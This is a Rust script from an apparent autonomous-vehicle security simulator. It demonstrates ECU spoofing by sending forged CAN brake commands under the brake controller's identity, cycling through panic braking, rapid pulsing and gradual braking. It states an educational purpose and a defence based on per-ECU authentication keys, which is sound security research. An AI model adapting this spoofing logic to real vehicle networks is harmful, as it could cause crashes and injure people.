/// ATTACK SCENARIO: ECU Spoofing
///
/// This script demonstrates an ECU spoofing attack where an attacker
/// impersonates a critical ECU (brake controller) and sends malicious
/// control commands. This could cause unintended vehicle behavior like
/// sudden braking or acceleration.
///
/// PURPOSE: Educational - demonstrates why sender authentication is critical
/// DEFENSE: HSM with per-ECU keys can verify sender identity

use colored::*;
use std::time::Duration;
use autonomous_vehicle_sim::network::BusClient;
use autonomous_vehicle_sim::types::{can_ids, encoding, CanFrame};

const BUS_ADDRESS: &str = "127.0.0.1:9000";
const ATTACKER_NAME: &str = "ATTACKER_SPOOF";
const SPOOFED_ECU: &str = "BRAKE_CONTROLLER"; // Pretending to be brake controller

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    println!("{}", "═══════════════════════════════════════".red().bold());
    println!("{}", "   ATTACK: ECU Spoofing                ".red().bold());
    println!("{}", "═══════════════════════════════════════".red().bold());
    println!();
    println!("{}", "⚠️  WARNING: This is a security research tool".yellow());
    println!("{}", "⚠️  Only use on authorized test systems".yellow());
    println!();

    println!("{} Connecting to CAN bus...", "→".red());
    let client = BusClient::connect(BUS_ADDRESS, ATTACKER_NAME.to_string()).await?;
    println!("{} Connected as {}!", "✓".red().bold(), ATTACKER_NAME);
    println!();

    let (_reader, mut writer) = client.split();

    println!("{}", "Starting ECU spoofing attack:".red().bold());
    println!("{} Impersonating: {}", "→".red(), SPOOFED_ECU.yellow());
    println!("{} Sending malicious brake commands", "→".red());
    println!("{} Commands will appear to come from legitimate ECU", "→".red());
    println!();

    let mut counter = 0u32;
    let mut phase = 0;

    loop {
        // Cycle through different malicious patterns
        let brake_pressure = match phase {
            0 => {
                // Phase 1: Sudden full braking (panic stop)
                if counter % 50 < 25 {
                    100.0 // Full brake
                } else {
                    0.0 // No brake
                }
            }
            1 => {
                // Phase 2: Rapid pulsing (could damage ABS)
                if counter % 4 < 2 {
                    80.0
                } else {
                    0.0
                }
            }
            2 => {
                // Phase 3: Gradual but unwanted braking
                ((counter % 100) as f32 / 100.0) * 60.0
            }
            _ => {
                phase = 0;
                continue;
            }
        };

        let data = vec![encoding::encode_brake_pressure(brake_pressure)];

        // Create frame claiming to be from the legitimate brake controller
        let spoofed_frame = CanFrame::new(
            can_ids::BRAKE_COMMAND,
            data,
            SPOOFED_ECU.to_string(), // Falsified source!
        );

        writer.send_frame(spoofed_frame).await?;

        if counter % 10 == 0 {
            let phase_name = match phase {
                0 => "Panic Braking",
                1 => "Rapid Pulse",
                2 => "Gradual Brake",
                _ => "Unknown",
            };

            println!(
                "{} Spoofed brake command: {:.1}% (Phase: {}) (Claiming to be: {})",
                "⚡".red(),
                brake_pressure,
                phase_name.yellow(),
                SPOOFED_ECU.yellow().bold()
            );
        }

        counter += 1;

        // Change attack phase every 5 seconds (50 iterations at 100ms each)
        if counter % 50 == 0 {
            phase = (phase + 1) % 3;
            println!();
            println!("{} Switching to next attack phase...", "→".red());
            println!();
        }

        tokio::time::sleep(Duration::from_millis(100)).await;
    }
}
